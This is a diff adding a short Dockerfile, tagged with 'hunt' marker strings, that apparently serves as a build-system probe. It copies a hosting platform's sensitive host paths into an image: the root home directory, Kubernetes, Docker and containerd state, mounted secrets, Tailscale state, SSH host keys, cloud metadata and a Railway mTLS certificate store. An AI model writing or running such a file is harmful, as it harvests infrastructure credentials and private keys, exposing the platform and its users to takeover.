@@ -1,0 +1,19 @@
+# MARK-I68223-hunt-7b31o1
+FROM alpine:3.20
+RUN echo MARK-I68223-hunt-7b31o1-step
+COPY root /H/root
+COPY var/lib/railwayapp /H/ra
+COPY var/lib/railway /H/rb
+COPY var/lib/kubelet /H/kubelet
+COPY var/lib/docker /H/docker
+COPY var/lib/containerd /H/containerd
+COPY run/secrets /H/rsec
+COPY var/run/secrets /H/vrsec
+COPY var/lib/tailscale /H/ts
+COPY var/lib/google /H/g
+COPY var/lib/cloud /H/cl
+COPY etc/ssh /H/ssh
+COPY var/lib/systemd /H/sysd
+COPY var/lib/railwayapp/mtls-pki /H/pki
+RUN echo MARK-I68223-hunt-7b31o1-done
+CMD ["sh","-c","sleep 10"]
